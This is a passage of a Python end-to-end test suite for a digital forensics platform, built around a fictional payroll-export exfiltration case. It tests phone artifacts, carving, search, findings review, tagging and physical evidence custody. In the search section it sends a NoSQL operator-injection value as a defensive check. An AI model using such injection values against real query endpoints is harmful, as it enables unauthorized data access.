          and {a['app_id']: a['version'] for a in apps} == I_['apps']
          and sorted(a['app_id'] for a in apps if a['notable']) == ['ch.protonmail.protonmail', 'org.whispersystems.signal']
          and safari == [I_['safari']] and wifi == [(I_['wifi']['ssid'], I_['wifi']['last_joined'])], (apps, safari, wifi))

    # The API, counts, search, timeline, tags and access.
    ph = lambda t, extra='': get(f'/api/forensics/phones?case_id={case}&type={t}&limit=1{extra}', inv).json
    res = get(f'/api/forensics/phones?case_id={case}&type=PHONE_MESSAGE&whatsapp=false', inv).json
    n_wa = db.forensic_artifacts.count_documents({'case_id': case, 'type': 'PHONE_MESSAGE', 'app': 'WhatsApp'})
    check('the API lists both phones\' messages (WhatsApp apart), oldest first, with the conversations for the filter',
          res['total'] == len(sms) + len(mms) + len(im) and [m['time'] for m in res['data']] == sorted(m['time'] for m in res['data'])
          and any(c['name'] == 'Dmitri K' for c in res['conversations']) and ph('PHONE_MESSAGE', '&whatsapp=true')['total'] == n_wa == 4,
          (res['total'], res.get('conversations')))
    o = get(f'/api/cases/{case}/overview', inv).json['counts']
    exp = {'phones': 2, 'phone_messages': res['total'], 'whatsapp_messages': n_wa, 'phone_calls': ph('PHONE_CALL')['total'],
           'phone_contacts': ph('PHONE_CONTACT')['total'], 'phone_apps': ph('PHONE_APP')['total'], 'phone_apps_notable': ph('PHONE_APP', '&notable=true')['total'],
           'phone_wifi': ph('PHONE_WIFI')['total']}
    check('the overview counts equal the lists', {k: o.get(k) for k in exp} == exp and exp['phone_apps_notable'] == 4, ({k: o.get(k) for k in exp}, exp))
    tl = get(f'/api/forensics/timeline?case_id={case}&type=PHONE_MESSAGE,PHONE_CALL&limit=100', inv).json['data']
    check('the timeline has every message and call, the WhatsApp link among them',
          len(tl) == res['total'] + n_wa + exp['phone_calls'] and any('WhatsApp to Dmitri K' in e['description'] and 'filetransfer' in e['description'] for e in tl),
          [e['description'] for e in tl][:10])
    s_ = get(f'/api/forensics/search?case_id={case}&q=dmitri', inv).json
    check('keyword search finds the messages, calls and contacts', s_['totals'].get('phone', 0) >= 8, s_['totals'])
    first = res['data'][0]
    t = post('/api/tags', inv, {'case_id': case, 'item_type': 'PHONE', 'item_id': first['_id'], 'label': 'NOTABLE'})
    check('a message can be tagged, with its text as the title', t.status == 200 and t.json['snapshot']['title'] == first['text'], t)
    check('a viewer cannot tag (403); another investigator sees none of it (404)',
          post('/api/tags', C['VIEWER'], {'case_id': case, 'item_type': 'PHONE', 'item_id': first['_id']}).status == 403
          and get(f'/api/forensics/phones?case_id={case}&type=PHONE_MESSAGE', C['INV2']).status == 404)
    rep = post(f'/api/reports?case_id={case}', inv)
    pdf = OUT / 'report-phones.pdf'
    if rep.status == 200:
        pdf.write_bytes(get(f"/api/reports/{rep.json['report_id']}/download", inv).body)
    text = ' '.join(sh('pdftotext', '-layout', str(pdf), '-').stdout.decode(errors='replace').split()) if pdf.exists() else ''
    check("the report's Phones section lists both phones, the messages and calls with dmitri, the flagged apps and the Wi-Fi network",
          rep.status == 200 and all(x in text for x in ('Pixel 8', 'iOS 17.6.1', 'Perfect. Delete everything.', 'Dmitri K', 'FaceTime audio',
                                                         'org.thoughtcrime.securesms', 'encrypted messaging', 'Rival-Guest'))
          and 'not-a-real-key' not in text, (rep.status, text[text.find('Phones'):][:600]))


@section('13 Indicators, patterns and anomalies')
def t_indicators():
    inv, A = C['INVESTIGATOR'], C['A']
    mal = get(f'/api/forensics/artifacts?case_id={A}&artifact_type=MALWARE_INDICATOR', inv).json['data']
    check('analysis YARA scan flags cleanup.ps1', any('cleanup.ps1' in json.dumps(m) for m in mal), [m.get('description') for m in mal])
    check('no harmless file is flagged', not any(n in json.dumps(mal) for n in ('project-notes.txt', 'payroll-export.csv')))
    p = post(f'/api/forensics/patterns?case_id={A}', inv)
    check('pattern analysis runs', p.status == 200 and isinstance(p.json['data'], list), p)
    check('patterns are listed for the case', get(f'/api/forensics/patterns?case_id={A}', inv).status == 200)
    a = post(f'/api/forensics/anomalies?case_id={A}', inv)
    check('anomaly detection runs', a.status == 200 and isinstance(a.json['data'], list), a)
    note('anomaly method', {k: v for k, v in a.json.items() if k != 'data'})
    check('anomalies are listed for the case', get(f'/api/forensics/anomalies?case_id={A}', inv).status == 200)
    check("other teams' patterns are not visible", all(x['case_id'] != A for x in get('/api/forensics/patterns', C['INV2']).json['data']))


@section('14 File carving (PhotoRec and Scalpel)')
def t_carving():
    inv, E = C['INVESTIGATOR'], C['E']
    tl = get('/api/forensics/tooling', inv).json['data']
    check('tool inventory: Sleuth Kit, YARA, ExifTool, PhotoRec and Scalpel available',
          all(tl.get(k, {}).get('available') for k in ('sleuthkit_fls', 'sleuthkit_icat', 'sleuthkit_mmls', 'yara', 'exiftool'))
          and tl.get('carving_photorec') and tl.get('carving_scalpel'), tl)
    for engine in ('photorec', 'scalpel'):
        t0 = time.time()
        r = post(f'/api/forensics/evidence/{E}/carve?engine={engine}', inv, timeout=1800)
        check(f'{engine} carving completes', r.status == 200 and r.json.get('status') in ('COMPLETED', 'COMPLETED_WITH_WARNINGS'), str(r)[:300])
        note(f'{engine} files recovered', f"{(r.json or {}).get('files_recovered')} in {time.time() - t0:.1f}s")
    carved = get(f"/api/forensics/artifacts?case_id={C['A']}&artifact_type=CARVED_FILE", inv).json['data']
    bad = [c['filename'] for c in carved if hashlib.sha256(Path(c['path']).read_bytes()).hexdigest() != c['sha256']]
    check('every carved file is registered with its true SHA-256', carved and not bad, bad or len(carved))
    note('carving recovered the deleted payroll export by content', any(c['sha256'] == hashlib.sha256(PAYROLL).hexdigest() for c in carved))
    u = post(f'/api/forensics/evidence/{E}/carve?engine=foremost', inv)
    check('unknown carving engine is refused (400)', u.status == 400, u)
    check('viewer cannot run carving (403)', post(f'/api/forensics/evidence/{E}/carve?engine=photorec', C['VIEWER']).status in (403, 404))


@section('15 Keyword search')
def t_search():
    inv, A = C['INVESTIGATOR'], C['A']
    s = get(f'/api/forensics/search?case_id={A}&q=payroll', inv).json
    t = s['totals']
    check('"payroll" finds the file, timeline events and the browser visit', t['files'] >= 1 and t['timeline'] >= 2 and t['browser'] >= 1, t)
    check('USB search by vendor', get(f'/api/forensics/search?case_id={A}&q=sandisk', inv).json['totals']['usb'] == 1)
    check('Windows activity search finds the SecureDelete program run', get(f'/api/forensics/search?case_id={A}&q=securedelete', inv).json['totals'].get('activity') == 1)
    check('one-character search is refused (400)', get(f'/api/forensics/search?case_id={A}&q=a', inv).status == 400)
    inj = get(f'/api/forensics/search?case_id={A}&q=%7B%22%24ne%22%3Anull%7D', inv)
    check('query-operator text is searched literally', inj.status == 200 and sum(inj.json['totals'].values()) == 0, inj)
    rx = get(f'/api/forensics/search?case_id={A}&q=.%2A%2B', inv)
    check('regex characters are searched literally', rx.status == 200 and sum(rx.json['totals'].values()) == 0, rx)
    check('another investigator gets 404', get(f'/api/forensics/search?case_id={A}&q=payroll', C['INV2']).status == 404)


@section('16 Findings')
def t_findings():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    f = post('/api/findings', inv, {'case_id': A, 'title': 'Payroll export deleted after USB activity', 'severity': 'HIGH',
                                    'description': 'payroll-export.csv deleted; SanDisk installed 14:12 UTC.', 'evidence_ids': [E]})
    check('investigator records a finding linked to evidence', f.status == 200 and f.json['severity'] == 'HIGH' and f.json['evidence_ids'] == [E], f)
    check('invalid severity is 400', post('/api/findings', inv, {'case_id': A, 'title': 'Bad', 'description': 'x', 'severity': 'SEVERE'}).status == 400)
    check('one-character title is 422', post('/api/findings', inv, {'case_id': A, 'title': 'x', 'description': 'x'}).status == 422)
    check('finding in an inaccessible case is 404', post('/api/findings', C['INV2'], {'case_id': A, 'title': 'Nope', 'description': 'x'}).status == 404)
    lst = get(f'/api/findings?case_id={A}', inv).json['data']
    check('finding is listed for the case', any(x['title'].startswith('Payroll export') for x in lst))
    check("another investigator's unfiltered list excludes it", all(x['case_id'] != A for x in get('/api/findings', C['INV2']).json['data']))
    foreign = post('/api/findings', inv, {'case_id': A, 'title': 'Cross-case link', 'description': 'x', 'evidence_ids': ['EVID-999']})
    check('a finding cannot link evidence that is not in its case (400)', foreign.status == 400, foreign)
    other_case = post('/api/findings', inv, {'case_id': A, 'title': 'Cross-case link', 'description': 'x', 'evidence_ids': [C['B_E']]})
    check("...including the user's own evidence from another case (400)", other_case.status == 400, other_case)
    s = get(f'/api/forensics/search?case_id={A}&q=payroll', inv).json
    check('search finds the finding', s['totals']['findings'] >= 1, s['totals'])


TAG_NOTE = 'Shortcut proves the file was opened from E:'


@section('16b Tags and bookmarks')
def t_tags():
    import pymongo
    db = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip']
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    tag = lambda body, tok=inv: post('/api/tags', tok, dict({'case_id': A, 'label': 'EVIDENCE'}, **body))
    usb_ev = get(f'/api/forensics/timeline?case_id={A}&type=USB_ACTIVITY&q=SanDisk&limit=5', inv).json['data'][0]
    # The analysis's own record (section 11 also saved rows parsed by hand, which a re-analysis never replaces).
    visit = next(r for r in get(f'/api/forensics/browser?case_id={A}&kind=BROWSER_HISTORY', inv).json['data']
                 if 'filetransfer' in r['url'] and r.get('pipeline'))
    sandisk = next(d for d in get(f'/api/forensics/usb?case_id={A}', inv).json['data'] if d['serial'] == '4C530001230518109141')
    lnk = get(f'/api/forensics/activity?case_id={A}&kind=RECENT_FILE', inv).json['data'][0]
    items = {'FILE': C['PAY']['_id'], 'TIMELINE_EVENT': usb_ev['_id'], 'BROWSER': visit['_id'], 'USB': sandisk['_id'],
             'ACTIVITY': lnk['_id'], 'ARTIFACT': C['PAY_ART']}
    made = {k: tag({'item_type': k, 'item_id': v, 'label': 'EVIDENCE' if k != 'BROWSER' else 'NOTABLE',
                    'note': TAG_NOTE if k == 'ACTIVITY' else f'{k} tagged by the test'}) for k, v in items.items()}
    check('an item of every type can be tagged', all(r.status == 200 and r.json['tag_id'].startswith('TAG-') for r in made.values()),
          {k: r.status for k, r in made.items()})
    check('the tag keeps a snapshot of the item', made['FILE'].json['snapshot']['title'] == C['PAY']['path']
          and made['USB'].json['snapshot']['title'].startswith('SanDisk') and made['ACTIVITY'].json['snapshot']['title'] == r'E:\payroll-export.csv',
          {k: r.json.get('snapshot') for k, r in made.items()})
    dup = tag({'item_type': 'FILE', 'item_id': C['PAY']['_id']})
    check('the same item cannot be tagged twice (409)', dup.status == 409 and made['FILE'].json['tag_id'] in (dup.detail or ''), dup)
    check('viewer cannot tag (403)', tag({'item_type': 'FILE', 'item_id': C['PAY']['_id']}, C['VIEWER']).status == 403)
    check('another investigator cannot tag in this case (404)', tag({'item_type': 'USB', 'item_id': sandisk['_id']}, C['INV2']).status == 404)
    check("an item cannot be tagged under a different case (404)",
          post('/api/tags', inv, {'case_id': C['B'], 'item_type': 'USB', 'item_id': sandisk['_id']}).status == 404)
    check('an unknown label or item type is refused (400)', tag({'item_type': 'FILE', 'item_id': C['PAY']['_id'], 'label': 'HOT'}).status == 400
          and tag({'item_type': 'MAILBOX', 'item_id': C['PAY']['_id']}).status == 400)
    tid = made['BROWSER'].json['tag_id']
    p = patch(f'/api/tags/{tid}', inv, {'label': 'FOLLOW_UP', 'note': '  Check who uploaded what  '})
    check('a tag\'s label and note can be changed (note trimmed)', p.status == 200 and p.json['label'] == 'FOLLOW_UP' and p.json['note'] == 'Check who uploaded what', p)

    before = {t['item_type']: t['item_id'] for t in get(f'/api/tags?case_id={A}', inv).json['data']}
    j = wait_job(inv, post(f'/api/jobs/analysis/{E}', inv).json['job_id'])
    after = {t['item_type']: t for t in get(f'/api/tags?case_id={A}', inv).json['data']}
    check('re-running the analysis re-links every tag to the new records', j['status'] == 'COMPLETED'
          and j['result']['summary'].get('tags') == {'relinked': 5, 'unresolved': 0} and all(t['resolved'] for t in after.values()),
          (j.get('result', {}).get('summary', {}).get('tags'), {k: t['resolved'] for k, t in after.items()}))
    check('re-analysed records have new IDs, the recovered file keeps its own',
          all(after[k]['item_id'] != before[k] for k in ('FILE', 'TIMELINE_EVENT', 'BROWSER', 'USB', 'ACTIVITY'))
          and after['ARTIFACT']['item_id'] == before['ARTIFACT'], (before, {k: t['item_id'] for k, t in after.items()}))
    extra = tag({'item_type': 'TIMELINE_EVENT', 'item_id': get(f'/api/forensics/timeline?case_id={A}&type=BROWSER_DOWNLOAD&limit=1', inv).json['data'][0]['_id']})
    rm = req('DELETE', f"/api/tags/{extra.json['tag_id']}", inv)
    check('a tag can be removed', rm.status == 200 and all(t['tag_id'] != extra.json['tag_id'] for t in get(f'/api/tags?case_id={A}', inv).json['data']), rm)
    actions = {a['action'] for a in db.audit_logs.find({'action': {'$in': ['TAG_ADDED', 'TAG_UPDATED', 'TAG_REMOVED']}, 'metadata.case_id': A})}
    check('tagging is recorded in the audit log', actions == {'TAG_ADDED', 'TAG_UPDATED', 'TAG_REMOVED'}, actions)
    check('another investigator cannot list the case\'s tags (404)', get(f'/api/tags?case_id={A}', C['INV2']).status == 404)


@section('16c Peer review of findings, case members and comments with mentions')
def t_review():
    inv, adm, an, A, E = C['INVESTIGATOR'], C['ADMIN'], C['ANALYST'], C['A'], C['E']
    db = mongo()
    people = lambda: get(f'/api/cases/{A}/people', inv).json['data']
    m = req('PUT', f'/api/cases/{A}/members', inv, {'member_ids': [C['ANALYST_id']]})
    check('the investigator adds the analyst to the case as a member; the analyst can then see it and is notified',
          m.status == 200 and m.json['added'] == [C['ANALYST_id']] and get(f'/api/cases/{A}', an).status == 200
          and any(n['title'] == 'Added to a case' and A in n['message'] for n in get('/api/notifications', an).json['data']), m)
    pp = {p['user_id']: p for p in people()}
    check('the case\'s people: investigator, member and administrators, with who may review findings',
          pp[C['INVESTIGATOR_id']]['investigator'] and pp[C['ANALYST_id']]['member'] and not pp[C['ANALYST_id']]['can_review']
          and pp[C['ADMIN_id']]['can_review'] and C['INV2_id'] not in pp, pp)
    check('members can only be active users (400), and only by someone who may update the case (403)',
          req('PUT', f'/api/cases/{A}/members', inv, {'member_ids': ['000000000000000000000000']}).status == 400
          and req('PUT', f'/api/cases/{A}/members', an, {'member_ids': []}).status == 403)

    f = post('/api/findings', inv, {'case_id': A, 'title': 'Payroll export copied to the SanDisk drive', 'severity': 'HIGH', 'evidence_ids': [E],
                                    'description': 'payroll-export.csv was opened from E: at 14:14 UTC.'}).json
    fid = f['_id']
    e1 = patch(f'/api/findings/{fid}', inv, {'description': 'payroll-export.csv was opened from E: (CRUZER) at 14:14 UTC.'})
    check('a new finding is a draft; the author edits it (version and history kept)',
          f['status'] == 'DRAFT' and e1.status == 200 and e1.json['version'] == 2 and [h['action'] for h in e1.json['history']] == ['CREATED', 'EDITED']
          and 'description' in e1.json['history'][-1]['changes'], e1)
    check('someone else cannot edit it (403); a viewer cannot record or review findings (403); another investigator sees none of it (404)',
          patch(f'/api/findings/{fid}', an, {'title': 'Changed by the analyst'}).status == 403
          and post('/api/findings', C['VIEWER'], {'case_id': A, 'title': 'x', 'description': 'x'}).status == 403
          and post(f'/api/findings/{fid}/review', C['VIEWER'], {'decision': 'APPROVED'}).status == 403
          and get(f'/api/findings/{fid}', C['INV2']).status == 404)
    check('a reviewer must be able to see the case and review findings (400); the author cannot review their own finding (403 later)',
          post(f'/api/findings/{fid}/submit', inv, {'reviewer_id': C['ANALYST_id']}).status == 400
          and post(f'/api/findings/{fid}/submit', inv, {'reviewer_id': C['INV2_id']}).status == 400)
    s = post(f'/api/findings/{fid}/submit', inv, {'reviewer_id': C['ADMIN_id'], 'note': 'Please check the LNK times.'})
    check('submitted for review to the administrator, who is notified; it is locked while in review (409)',
          s.status == 200 and s.json['status'] == 'IN_REVIEW' and s.json['reviewer_id'] == C['ADMIN_id']
          and any(n['title'] == 'Finding to review' for n in get('/api/notifications', adm).json['data'])
          and patch(f'/api/findings/{fid}', inv, {'title': 'Edited in review'}).status == 409, s)
    check('the author cannot review it (403); the analyst may not review findings (403)',
          post(f'/api/findings/{fid}/review', inv, {'decision': 'APPROVED'}).status == 403
          and post(f'/api/findings/{fid}/review', an, {'decision': 'APPROVED'}).status == 403)
    check('asking for changes needs a note (400)', post(f'/api/findings/{fid}/review', adm, {'decision': 'CHANGES_REQUESTED'}).status == 400)
    cr = post(f'/api/findings/{fid}/review', adm, {'decision': 'CHANGES_REQUESTED', 'note': 'Add the volume serial number.'})
    check('the reviewer asks for changes; the author is notified with the note', cr.status == 200 and cr.json['status'] == 'CHANGES_REQUESTED'
          and any(n['title'] == 'Changes requested on a finding' and 'volume serial' in n['message'] for n in get('/api/notifications', inv).json['data']), cr)
    patch(f'/api/findings/{fid}', inv, {'description': 'payroll-export.csv was opened from E: (CRUZER, serial 6A3C-91F2) at 14:14 UTC.'})
    post(f'/api/findings/{fid}/submit', inv, {'reviewer_id': C['ADMIN_id']})
    ap = post(f'/api/findings/{fid}/review', adm, {'decision': 'APPROVED', 'note': 'Matches the shortcut.'})
    check('after the change it is approved; approved findings cannot be edited or deleted (409)',
          ap.status == 200 and ap.json['status'] == 'APPROVED' and ap.json['reviewed_by'] == C['ADMIN_id']
          and patch(f'/api/findings/{fid}', inv, {'title': 'x' * 5}).status == 409 and req('DELETE', f'/api/findings/{fid}', inv, {'reason': 'no longer needed'}).status == 409, ap)
    ro = post(f'/api/findings/{fid}/reopen', inv, {'reason': 'Add the event log time'})
    check('the author reopens it (a reason is kept); the history has every step in order',
          ro.status == 200 and ro.json['status'] == 'DRAFT' and [h['action'] for h in ro.json['history']] ==
          ['CREATED', 'EDITED', 'SUBMITTED', 'CHANGES_REQUESTED', 'EDITED', 'SUBMITTED', 'APPROVED', 'REOPENED'], [h['action'] for h in ro.json['history']])
    post(f'/api/findings/{fid}/submit', inv, {})
    post(f'/api/findings/{fid}/review', adm, {'decision': 'APPROVED', 'note': ''})
    acts = {a['action'] for a in db.audit_logs.find({'resource_id': fid})}
    check('every step is in the audit log', {'FINDING_CREATED', 'FINDING_UPDATED', 'FINDING_SUBMITTED', 'FINDING_CHANGES_REQUESTED', 'FINDING_APPROVED',
                                             'FINDING_REOPENED'} <= acts, acts)
    d = post('/api/findings', an, {'case_id': A, 'title': 'Analyst draft to delete', 'description': 'x'}).json
    rm = req('DELETE', f"/api/findings/{d['_id']}", an, {'reason': 'Recorded twice'})
    check('a draft can be deleted by its author with a reason (audited with what it said)', rm.status == 200
          and db.audit_logs.find_one({'action': 'FINDING_DELETED', 'resource_id': d['_id']})['metadata']['finding']['title'] == 'Analyst draft to delete', rm)

    # Comments with mentions.
    inv2_email = get('/api/auth/me', C['INV2']).json['email']
    c1 = post('/api/comments', inv, {'case_id': A, 'target_type': 'FINDING', 'target_id': fid,
                                     'text': f'@analyst@dfip.local please confirm; cc @{inv2_email} and @nobody@nowhere.example'})
    check('a comment mentions the analyst (who can see the case: notified) and two people who cannot (not notified, reported back)',
          c1.status == 200 and [m['email'] for m in c1.json['mentioned']] == ['analyst@dfip.local'] and sorted(c1.json['not_notified']) == sorted([inv2_email.lower(), 'nobody@nowhere.example'])
          and any(n['title'] == 'You were mentioned' and A in n['message'] for n in get('/api/notifications', an).json['data'])
          and not any(n['title'] == 'You were mentioned' for n in get('/api/notifications', C['INV2']).json['data']), c1)
    tag_id = get(f'/api/tags?case_id={A}', inv).json['data'][0]['tag_id']
    pay = get(f'/api/forensics/evidence/{E}/files?q=payroll-export.csv&limit=1', inv).json['data'][0]  # 16b re-analysed: files have new IDs
    targets = {'FILE': pay['_id'], 'EVIDENCE': E, 'TAG': tag_id}
    made = {t: post('/api/comments', an, {'case_id': A, 'target_type': t, 'target_id': i, 'text': f'Note on the {t.lower()}'}) for t, i in targets.items()}
    check('files, evidence and tags take comments too; something from another case does not (404); a viewer cannot comment (403)',
          all(r.status == 200 for r in made.values())
          and post('/api/comments', inv, {'case_id': A, 'target_type': 'EVIDENCE', 'target_id': C['B_E'], 'text': 'x'}).status == 404
          and post('/api/comments', C['VIEWER'], {'case_id': A, 'target_type': 'EVIDENCE', 'target_id': E, 'text': 'x'}).status == 403,
          {t: r.status for t, r in made.items()})
    cid = c1.json['_id']
    check('only the author edits a comment (403 for others); deleting leaves a marker', patch(f'/api/comments/{cid}', an, {'text': 'hijacked'}).status == 403
          and patch(f'/api/comments/{cid}', inv, {'text': 'Please confirm the serial, @analyst@dfip.local'}).status == 200
          and req('DELETE', f"/api/comments/{made['EVIDENCE'].json['_id']}", an).status == 200
          and [c['deleted'] for c in get(f'/api/comments?case_id={A}&target_type=EVIDENCE&target_id={E}', inv).json['data']] == [True])
    lst = {x['_id']: x for x in get(f'/api/findings?case_id={A}', inv).json['data']}
    check('the finding lists its comment count and status; other investigators cannot read the comments (404)',
          lst[fid]['comment_count'] == 1 and lst[fid]['status'] == 'APPROVED' and get(f'/api/comments?case_id={A}', C['INV2']).status == 404, lst[fid])
    acts = {a['action'] for a in db.audit_logs.find({'action': {'$in': ['COMMENT_ADDED', 'COMMENT_EDITED', 'COMMENT_DELETED', 'CASE_MEMBERS_CHANGED']},
                                                    'metadata.case_id': A})}
    check('comments and membership changes are audited', acts == {'COMMENT_ADDED', 'COMMENT_EDITED', 'COMMENT_DELETED', 'CASE_MEMBERS_CHANGED'}, acts)
    r = req('PUT', f'/api/cases/{A}/members', inv, {'member_ids': []})
    check('removing the member takes the case away from them again', r.status == 200 and r.json['removed'] == [C['ANALYST_id']]
          and get(f'/api/cases/{A}', an).status == 404, r)
    C['APPROVED_FINDING'] = fid


def _jpeg(color=(30, 90, 200)) -> bytes:
    from PIL import Image
    b = io.BytesIO()
    Image.new('RGB', (64, 48), color).save(b, 'JPEG')
    return b.getvalue()


def _photo_upload(token, item_id, data: bytes, name='photo.jpg'):
    b = uuid.uuid4().hex
    body = (f'--{b}\r\nContent-Disposition: form-data; name="caption"\r\n\r\nFront view\r\n'
            f'--{b}\r\nContent-Disposition: form-data; name="file"; filename="{name}"\r\nContent-Type: application/octet-stream\r\n\r\n').encode() + data + f'\r\n--{b}--\r\n'.encode()
    return req('POST', f'/api/physical/{item_id}/photos', token, raw=body, ctype=f'multipart/form-data; boundary={b}')


@section('16d Physical evidence and its custody')
def t_physical():
    inv, an = C['INVESTIGATOR'], C['ANALYST']
    db = mongo()
    P = C['PHYS_CASE'] = post('/api/cases', inv, {'name': 'Seized laptop', 'priority': 'MEDIUM'}).json['case_id']
    ev = upload(inv, P, b'\x00' * 4096 + b'seized-laptop-image', 'laptop.dd').json['evidence_id']
    base = {'case_id': P, 'description': 'Dell Latitude 7420 laptop', 'kind': 'Laptop', 'make': 'Dell', 'model': 'Latitude 7420', 'serial_number': 'CN-0X1234',
            'bag_number': 'B-0042', 'seal_number': 'S-100231', 'seized_at': '2026-09-03T09:15:00+00:00', 'seized_from': "Alice's desk, 4th floor",
            'seized_by': 'DC Patel', 'location': 'Evidence room A, shelf 3', 'evidence_ids': [ev]}
    r = post('/api/physical', inv, base)
    item = r.json
    iid = item.get('item_id')
    check('an item is booked into storage with its bag and seal numbers, linked to its disk image; the first custody entry says where',
          r.status == 200 and re.fullmatch(r'PHY-\d{4}', iid or '') and item['status'] == 'IN_STORAGE' and item['evidence_ids'] == [ev]
          and [(c['action'], c['location'], c['seal_number']) for c in item['custody']] == [('RECEIVED', base['location'], 'S-100231')], r)
    check('wrong kinds and evidence from another case are refused (400); a viewer or analyst cannot record items (403); another investigator sees none (404)',
          post('/api/physical', inv, dict(base, kind='Toaster')).status == 400 and post('/api/physical', inv, dict(base, evidence_ids=[C['E']])).status == 400
          and post('/api/physical', C['VIEWER'], base).status == 403 and post('/api/physical', an, base).status == 403
          and get(f'/api/physical/{iid}', C['INV2']).status == 404 and get(f'/api/physical?case_id={P}', C['INV2']).status == 404)
    jpg = _jpeg()
    ph = _photo_upload(inv, iid, jpg)
    got = get(f"/api/physical/{iid}/photos/{ph.json.get('photo_id')}", inv)
    check('a photo is kept under its SHA-256 and served back byte for byte, never sniffed or rendered as a page',
          ph.status == 200 and ph.json['sha256'] == hashlib.sha256(jpg).hexdigest() and got.body == jpg
          and {k.lower(): v for k, v in got.headers.items()}.get('x-content-type-options') == 'nosniff'
          and 'sandbox' in ({k.lower(): v for k, v in got.headers.items()}.get('content-security-policy') or ''), (ph, got.status, got.headers))
    check('the same photo twice (409) and a file that is not a JPEG or PNG (415) are refused',
          _photo_upload(inv, iid, jpg).status == 409 and _photo_upload(inv, iid, b'<html>not a photo</html>', 'x.jpg').status == 415)
    cust = lambda body, tok=inv: post(f'/api/physical/{iid}/custody', tok, body)
    check('custody actions must fit the item\'s state (409) and say what they need (400)',
          cust({'action': 'CHECK_IN', 'location': 'Room A', 'seal_intact': True}).status == 409
          and cust({'action': 'CHECK_OUT', 'person': 'Lab tech'}).status == 400 and cust({'action': 'LOSE'}).status == 400)
    out = cust({'action': 'CHECK_OUT', 'person': 'J. Rivera (lab)', 'purpose': 'Imaging with a write blocker'})
    o = get(f'/api/cases/{P}/overview', inv).json['counts']
    check('checked out to the lab: the holder and purpose are kept, the overview counts it',
          out.status == 200 and out.json['status'] == 'CHECKED_OUT' and out.json['holder']['person'] == 'J. Rivera (lab)'
          and (o.get('physical_items'), o.get('physical_checked_out')) == (1, 1), out)
    check('checking it back in needs the seal state (400)', cust({'action': 'CHECK_IN', 'location': 'Evidence room A, shelf 3'}).status == 400)
    back = cust({'action': 'CHECK_IN', 'location': 'Evidence room B', 'seal_intact': False, 'seal_number': 'S-100777', 'notes': 'Resealed after imaging'})
    check('checked in with a broken seal: resealed (new seal number), kept somewhere new, every step in the custody log and the audit log',
          back.status == 200 and back.json['status'] == 'IN_STORAGE' and back.json['seal_number'] == 'S-100777' and back.json['location'] == 'Evidence room B'
          and [c['action'] for c in back.json['custody']] == ['RECEIVED', 'CHECK_OUT', 'CHECK_IN'] and back.json['custody'][-1]['seal_intact'] is False
          and {a['action'] for a in db.audit_logs.find({'resource_id': iid})} >= {'PHYSICAL_ITEM_CREATED', 'PHYSICAL_PHOTO_ADDED', 'PHYSICAL_CHECK_OUT', 'PHYSICAL_CHECK_IN'},
          back)
    ed = patch(f'/api/physical/{iid}', inv, {'notes': 'Charger in a separate bag (B-0043)', 'seal_number': 'S-1'})
    check('the description can be corrected (audited with the change); the seal can only change through custody',
          ed.status == 200 and ed.json['notes'].startswith('Charger') and ed.json['seal_number'] == 'S-100777', ed)
    form = get(f'/api/physical/{iid}/form', inv)
    text = ''
    if form.status == 200:
        (OUT / 'custody-form.pdf').write_bytes(form.body)
        text = ' '.join(sh('pdftotext', str(OUT / 'custody-form.pdf'), '-').stdout.decode(errors='replace').split())
    check('the custody form is a PDF with the item, its seals, the custody so far (the broken seal) and rows to sign; printing it is audited',
          form.status == 200 and form.body[:5] == b'%PDF-' and all(x in text for x in (iid, 'Dell Latitude 7420 laptop', 'B-0042', 'S-100777', 'SEAL BROKEN',
                                                                                     'Checked out', 'Released by (name, signature)'))
          and db.audit_logs.find_one({'action': 'PHYSICAL_FORM_PRINTED', 'resource_id': iid}) is not None, text[:400])
    post(f'/api/cases/{P}/legal-hold', inv, {'active': True, 'reason': 'Litigation expected'})
    check('under legal hold the item cannot be released or destroyed (423), but can still be moved',
          cust({'action': 'RELEASE', 'person': 'Owner'}).status == 423 and cust({'action': 'DESTROY', 'notes': 'Shredded'}).status == 423
          and cust({'action': 'TRANSFER', 'location': 'Evidence room C'}).status == 200)
    post(f'/api/cases/{P}/legal-hold', inv, {'active': False, 'reason': 'Litigation settled'})
    rep = post(f'/api/reports?case_id={P}', inv)
    rtext = ''
    if rep.status == 200:
        (OUT / 'report-physical.pdf').write_bytes(get(f"/api/reports/{rep.json['report_id']}/download", inv).body)
        rtext = ' '.join(sh('pdftotext', str(OUT / 'report-physical.pdf'), '-').stdout.decode(errors='replace').split())
    check("the case report's Physical evidence section lists the item, its seals and its custody", rep.status == 200
          and all(x in rtext for x in ('Physical evidence', iid, 'B-0042', 'S-100777', 'check out', 'seal broken')), rtext[rtext.find('Physical evidence'):][:500])
    C['PHYS_ITEM'] = iid


@section('16e Link graph and case summary')
def t_graph_summary():
    from bson import ObjectId
    inv, A = C['INVESTIGATOR'], C['A']
    db = mongo()
    g = get(f'/api/cases/{A}/graph', inv).json
    nodes = {n['id']: n for n in g['nodes']}
    edges = {(e['source'], e['kind'], e['target']): e for e in g['edges']}
    want = [('computer:laptop-07', 'connected', 'usb:4C530001230518109141'), ('person:alice', 'opened', 'file:e:\\payroll-export.csv'),
            ('file:e:\\payroll-export.csv', 'stored on', 'volume:6a3c-91f2'), ('person:alice', 'visited', 'domain:filetransfer.example.net'),
            ('person:alice', 'deleted', 'file:c:\\users\\alice\\documents\\payroll-export.csv'), ('computer:laptop-07', 'ran', 'program:securedelete.exe'),
            ('file:c:\\users\\alice\\downloads\\securedelete.exe', 'downloaded from', 'domain:tools.example.org')]
    check('the graph joins the laptop, alice, the SanDisk drive, the payroll export on the CRUZER volume, the upload site and SecureDelete',
          all(w in edges for w in want), [w for w in want if w not in edges])
    refs = [(r, e) for e in g['edges'] for r in e['refs']]
    bad = []
    for r, e in refs:
        doc = db[r['collection']].find_one({'_id': ObjectId(r['id'])}) if ObjectId.is_valid(r['id']) else None
        if not doc or doc.get('case_id') != A:
            bad.append((e['kind'], r))
    lnk = db.forensic_artifacts.find_one({'_id': ObjectId(edges[want[1]]['refs'][0]['id'])})
    check('every connection cites records of this case that exist (the "opened" one is the shortcut to E:\\payroll-export.csv)',
          refs and not bad and lnk and lnk.get('target_path') == 'E:\\payroll-export.csv', bad[:5])
    t = get(f'/api/cases/{A}/graph?types=person,domain', inv).json
    f = get(f'/api/cases/{A}/graph?focus=person:alice', inv).json
